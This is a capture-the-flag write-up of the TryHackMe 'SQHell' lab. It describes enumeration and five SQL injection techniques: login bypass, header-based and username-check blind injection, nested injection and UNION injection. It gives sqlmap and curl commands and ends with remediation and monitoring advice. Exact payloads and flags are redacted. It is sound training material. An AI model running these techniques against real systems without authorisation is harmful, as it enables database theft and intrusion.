# SQHell Challenge

![Banner](./../IMAGES/sqhell_img.png?raw=true)

**Pathway:** *N/A* | **Section:** *N/A* | **Challenge:** *[SQHell](https://tryhackme.com/room/sqhell)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **25 July 2026**.
>
> **Spoiler warning:** This write-up documents the exploitation chain, although exact SQL injection payloads, database-specific values and flag codes are not shown.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents exact payloads, database names, internal values or other challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security.

Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

SQHell is a web application security challenge focused entirely on SQL injection. The objective was to recover five flags by identifying and exploiting several different injection styles across the application.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating the exposed SSH and HTTP services.
3. Discovering the `/login`, `/post`, `/register`, `/user` and `/terms-and-conditions` routes.
4. Bypassing the login form with an authentication SQL injection to recover Flag 1.
5. Exploiting a time-based blind SQL injection in the `X-Forwarded-For` header to recover Flag 2.
6. Exploiting a time-based blind SQL injection in the registration username availability checker to recover Flag 3.
7. Exploiting a nested SQL injection in the user profile function to recover Flag 4.
8. Exploiting a UNION-based SQL injection in the post viewer to recover Flag 5.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: sqhell.thm
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> sqhell.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts sqhell.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms depend on hostname-based routing, virtual hosts, redirects, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but not something anybody should be proud of.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/sqhell\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` and `ping` for validating local hostname resolution and connectivity.
- RustScan and Nmap for TCP port, service and script enumeration.
- WhatWeb for identifying web technologies.
- Dirsearch, Gobuster, Feroxbuster and FFUF for web content discovery.
- Firefox for interacting with the web application.
- cURL for manually testing SQL injection behaviour.
- SQLMap for confirming and extracting data from blind SQL injection points.

Click [HERE](https://github.com/Valikahn/TryHackMe-Jr-Penetration-Tester#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Connectivity and Routing

The hostname mapping and VPN route were checked before touching the application:

```bash
getent hosts sqhell.thm
ip route get <TARGET_IP>
ip -br address show tun0
ping -c 4 sqhell.thm
```

The output confirmed that:

- `sqhell.thm` resolved to `<TARGET_IP>`.
- Traffic to the target was routed through `tun0`.
- The Kali VPN source address was `<TUN0_IP>`.
- The target responded over the TryHackMe VPN.

### Port and Service Discovery

A rapid RustScan scan was performed:

```bash
rustscan -a sqhell.thm --ulimit 5000 -- -sC -sV -Pn
```

Nmap was then used to verify the results:

```bash
nmap -p22,80 -sV -sC -Pn -T4 sqhell.thm
```

The principal findings were:

```text
22/tcp open  ssh
80/tcp open  http
```

Service detection identified:

```text
SSH:  OpenSSH on Ubuntu
HTTP: nginx on Ubuntu
```

SSH was not immediately useful because no credentials had been recovered. The investigation therefore focused on the web application.

### Web Technology Identification

WhatWeb identified a Bootstrap and jQuery-based application served by Nginx:

```bash
whatweb sqhell.thm/
```

The result included:

```text
Bootstrap
jQuery
nginx
Ubuntu Linux
```

### Web Content Discovery

Several content-discovery tools were used to cross-check the available routes.

```bash
dirsearch -u sqhell.thm/
```

```bash
gobuster dir \
  -u http://sqhell.thm/ \
  -w /usr/share/wordlists/dirb/big.txt
```

```bash
feroxbuster \
  -u http://sqhell.thm/ \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,txt,html,py \
  -t 50 \
  -k \
  -C 404 \
  --redirects
```

The important routes were:

```text
/login
/post
/register
/register/user-check
/user
/terms-and-conditions
```

The `/post` and `/user` routes both returned:

```text
Missing parameter: id
```

The registration page also revealed a client-side request to:

```text
/register/user-check?username=
```

The Terms and Conditions page contained the important clue that the application logged visitors' IP addresses.

## Exploits

### Flag 1 - Login Authentication Bypass

The first flag was found through the `/login` page.

The login form accepted a conventional SQL injection authentication bypass in the username field. The exact payload is intentionally redacted:

```text
Username: <REDACTED>
Password: <REDACTED>
```

The payload terminated the original username string, introduced a condition that evaluated as true and commented out the remaining password comparison.

Successful authentication returned the first flag:

```text
THM{....}
```

This confirmed that the login query was being constructed from unsanitised user input rather than using a prepared statement.

### Flag 2 - SQL Injection in the X-Forwarded-For Header

The Terms and Conditions page stated that visitor IP addresses were logged for analytics. This suggested that an HTTP header used to represent the client's IP address might be stored or processed by the database.

The `X-Forwarded-For` header was tested with SQLMap:

```bash
sqlmap \
  -u 'http://sqhell.thm/' \
  --headers='X-Forwarded-For: <REDACTED>*' \
  --dbms=mysql \
  -D <REDACTED> \
  -T flag \
  --dump \
  --batch
```

SQLMap identified the custom header as vulnerable to time-based blind SQL injection:

```text
Parameter: X-Forwarded-For
Type: time-based blind
Back-end DBMS: MySQL
```

The `flag` table contained one record:

```text
THM{....}
```

No clear-text response directly exposed the database value. SQLMap inferred each character by comparing response delays caused by conditional database sleep operations.

### Flag 3 - Registration Username Availability Check

The registration page performed an asynchronous username availability request:

```text
/register/user-check?username=<VALUE>
```

The endpoint was tested with SQLMap:

```bash
sqlmap \
  -u 'http://sqhell.thm/register/user-check?username=<REDACTED>' \
  -p username \
  --dbms=mysql \
  -D <REDACTED> \
  -T flag \
  --dump \
  --batch
```

SQLMap confirmed another time-based blind SQL injection in the `username` parameter:

```text
Parameter: username
Type: time-based blind
Back-end DBMS: MySQL
```

The recovered table contained:

```text
THM{....}
```

As with Flag 2, the value was extracted by measuring conditional response delays rather than reading it directly from the application's output.

### Flag 4 - Nested SQL Injection in the User Profile

The `/user` endpoint accepted an `id` parameter:

```text
/user?id=<VALUE>
```

A UNION test showed that the query returned three columns and that injected values could influence the displayed user record:

```bash
curl -sG 'http://sqhell.thm/user' \
  --data-urlencode 'id=<REDACTED>'
```

The response displayed controlled values in the user details, confirming the first stage of the injection.

The application then reused one of those database-supplied values in a second query. This allowed a second SQL injection statement to be placed inside the result of the first injection.

The final nested request is intentionally redacted:

```bash
curl -sG 'http://sqhell.thm/user' \
  --data-urlencode 'id=<REDACTED>'
```

The inner query selected the flag value from the challenge's `flag` table. The result appeared as an additional post title in the user profile:

```text
THM{....}
```

This was a nested, or second-order, SQL injection because attacker-controlled data produced by one query was subsequently interpreted as SQL by another query.

### Flag 5 - UNION-Based SQL Injection in the Post Viewer

The `/post` route required an `id` parameter:

```text
/post?id=<VALUE>
```

A UNION-based test established the correct column count and identified which output column was visible:

```bash
curl -sG 'http://sqhell.thm/post' \
  --data-urlencode 'id=<REDACTED>'
```

The response displayed the current database user in the post body:

```text
<REDACTED>@localhost
```

The visible column was then used to retrieve the value from the `flag` table:

```bash
curl -sG 'http://sqhell.thm/post' \
  --data-urlencode 'id=<REDACTED>'
```

The post body returned:

```text
THM{....}
```

The invalid original record identifier prevented a normal post from obscuring the injected UNION result.

### Decoding and Data Transformation

No Base64, hexadecimal, URL-safe encoding or custom cipher had to be manually decoded during this challenge.

cURL's `--data-urlencode` option was used to safely encode SQL injection strings into query parameters. This prevented spaces, comment characters and other reserved URL characters from being misinterpreted by the shell or HTTP client.

For example:

```bash
curl -sG 'http://sqhell.thm/<REDACTED>' \
  --data-urlencode '<PARAMETER>=<REDACTED>'
```

## Full Attack Chain Recap

1. Connected the Kali VM to the TryHackMe VPN.
2. Added `<TARGET_IP> sqhell.thm` to `/etc/hosts`.
3. Confirmed hostname resolution, VPN routing and the `<TUN0_IP>` address.
4. Identified SSH on port 22 and Nginx HTTP on port 80.
5. Enumerated the principal web routes.
6. Bypassed the `/login` authentication query and recovered Flag 1.
7. Followed the IP logging clue from the Terms and Conditions page.
8. Exploited time-based blind SQL injection in `X-Forwarded-For` and recovered Flag 2.
9. Exploited time-based blind SQL injection in the registration username checker and recovered Flag 3.
10. Confirmed a three-column UNION injection in `/user`.
11. Chained a nested SQL injection through the application's second database query and recovered Flag 4.
12. Confirmed a four-column UNION injection in `/post`.
13. Placed the flag column into the visible post-body field and recovered Flag 5.

The flags were recovered in this order:

```text
Flag 1: THM{....}
Flag 2: THM{....}
Flag 3: THM{....}
Flag 4: THM{....}
Flag 5: THM{....}
```

## Key Lessons

### SQL Injection Is Not One Single Technique

The challenge demonstrated several distinct SQL injection patterns:

- Authentication bypass.
- UNION-based data extraction.
- Time-based blind extraction.
- Header-based injection.
- Nested or second-order injection.

Finding one injectable field did not automatically solve the whole room. Each endpoint processed input differently and required a different exploitation method.

### Headers Are Still User-Controlled Input

The `X-Forwarded-For` header may look like trusted infrastructure metadata, but clients can usually supply it directly unless a reverse proxy overwrites and validates it.

Any header that reaches database logic must be treated with the same suspicion as form values, cookies and URL parameters.

### Client-Side Restrictions Are Not Security Controls

The registration button stated that registrations were closed, but the page still exposed a live username-checking endpoint.

Disabling a button in the browser does not remove the underlying server-side functionality.

### Blind Injection Requires Patience and Stable Timing

Time-based extraction depends on comparing response delays. Network instability can create false results or make extraction considerably slower.

SQLMap's timing calibration helped reduce the delay once stable responses had been observed.

### Second-Order Injection Can Hide Behind Apparently Safe Data

The nested injection worked because a value returned from one database query was later inserted into another query without safe parameterisation.

Data does not become trustworthy simply because it came from the application's own database.

### Keep `/etc/hosts` Under Control

For hostname-dependent rooms, an incorrect or duplicated hosts entry can derail enumeration and exploitation before the real challenge even begins.

Cleaning old entries after each room keeps troubleshooting simple and avoids wasting time on stale mappings.

## Remediation Notes

### Use Prepared Statements Everywhere

All database queries should use parameterised statements. User-controlled data must never be concatenated into SQL strings.

This applies to:

- Login form fields.
- Numeric record identifiers.
- Registration and availability checks.
- Values read from HTTP headers.
- Data retrieved from earlier database queries.

### Validate Numeric Identifiers

The `id` parameters should be converted to integers and rejected if they contain anything other than the expected numeric format.

Input validation is not a replacement for prepared statements, but it provides a useful additional control.

### Treat Proxy Headers as Untrusted

The application should not trust arbitrary client-supplied `X-Forwarded-For` values.

A trusted reverse proxy should:

1. Remove inbound spoofed forwarding headers.
2. Insert its own validated client address.
3. Ensure the application only accepts forwarding metadata from known proxy systems.

The logging query must still use a prepared statement.

### Remove or Protect Unused Endpoints

If account registration is disabled, supporting endpoints such as username availability checks should be removed or protected.

Unused application functionality increases the attack surface and can expose vulnerabilities even when the main feature appears unavailable.

### Avoid Reusing Database Values in Dynamic SQL

Values retrieved from a database should not be inserted into another SQL statement through string concatenation.

Second-order injection is prevented by parameterising every query at the point where it is executed, regardless of where the input originated.

### Apply Least-Privilege Database Permissions

Each application component should use a database account with only the permissions it requires.

A vulnerable read-only feature should not be able to query unrelated tables or databases containing challenge flags, credentials or sensitive records.

### Improve Monitoring

Security monitoring should detect:

- SQL comment sequences in input.
- Repeated conditional sleep queries.
- Suspicious UNION statements.
- Unusual values in forwarding headers.
- Repeated requests with small timing variations.
- Automated extraction patterns associated with tools such as SQLMap.

Monitoring should support prevention and investigation, not replace secure query construction.

## Disclaimer

This write-up documents activity performed in an authorised TryHackMe lab environment.

The techniques described are intended for education, defensive learning and lawful security testing only. They must not be used against systems without explicit permission from the system owner.

The exact target address, VPN address, SQL payloads, database-specific values and flags have been redacted to avoid publishing direct challenge answers.
